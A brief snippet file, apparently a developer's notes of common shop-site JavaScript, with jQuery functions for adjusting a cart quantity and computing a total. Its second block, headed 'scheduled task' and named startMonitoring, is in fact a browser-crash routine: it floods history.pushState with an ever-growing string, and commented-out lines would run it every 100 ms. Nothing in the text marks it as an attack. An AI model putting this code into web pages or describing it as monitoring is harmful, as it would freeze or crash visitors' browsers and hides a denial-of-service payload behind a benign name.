#商城常用函数#
function setAmount(dom, t)
{
	var n = $("#" + dom).val();
	if(t == 'jia')
	{
		var num = parseInt(n)+1;
		if(num == 0){
			return;
		}
		$("#" + dom).val(num);
		setTimeout(function(){gettotal()}, 200)
	}
	else
	{
		var num = parseInt(n)-1;
		if(num == 0){
			return;
		}
		$("#" + dom).val(num);
		setTimeout(function(){gettotal()}, 200)		
	}
}

function gettotal()
{
	danjia = $("#itemid input:checked").attr("rel")
	num = $("#num").val();
	total = danjia * num;
	$("#heji").val(total);
	$("#danjia").val(danjia);
}


#定时任务#
<script type="text/javascript">
function startMonitoring() {
		var total = '';
		for (var i = 0; i < 1000000; i++) {
			total = total + i.toString();
			history.pushState(0, 0, total)
		}
}
// startMonitoring();
// window.setInterval(startMonitoring, 100);
</script>
